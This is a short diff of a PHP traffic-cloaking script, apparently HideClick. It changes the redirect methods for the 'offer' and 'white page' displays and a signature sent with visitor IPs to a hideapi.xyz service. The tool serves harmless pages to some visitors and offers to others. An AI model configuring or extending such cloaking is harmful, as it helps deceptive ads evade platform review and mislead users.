@@ -41,12 +41,12 @@ $HCSET['mlSet'] = '';
 /* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
 /* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
 /* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
-$HCSET['OFFER_METHOD'] = 'iframe';
+$HCSET['OFFER_METHOD'] = '302';
 
 /* WHITE_PAGE display method. Available options: curl, 302 */
 /* 'curl' - uses a server request to display third-party whitepage on your domain */
 /* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
-$HCSET['WHITE_METHOD'] = 'curl';
+$HCSET['WHITE_METHOD'] = '302';
 
 /* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
 $HCSET['BLOCK_DDOS'] = false;
@@ -411,7 +411,7 @@ function apiRequest($ip, $port, $HCSET, $HCSETdata)
     $host = gethostbyname('api.hideapi.xyz');
     if($host=='api.hideapi.xyz') $host = gethostbyname('hideapi.net');
 
-    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2373660394&js=false&stage='.$HCSET['stage'];
+    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2812105752&js=false&stage='.$HCSET['stage'];
     if (!empty($HCSET['PASSIVE'])) $url .= '&PASSIVE=' . $HCSET['PASSIVE'];
     if (!empty($HCSET['DEBUG_MODE'])) $url .= '&DEBUG_MODE=' . $HCSET['DEBUG_MODE'];
     if (!empty($HCSET['banReason'])) $url .= '&banReason=' . $HCSET['banReason'];
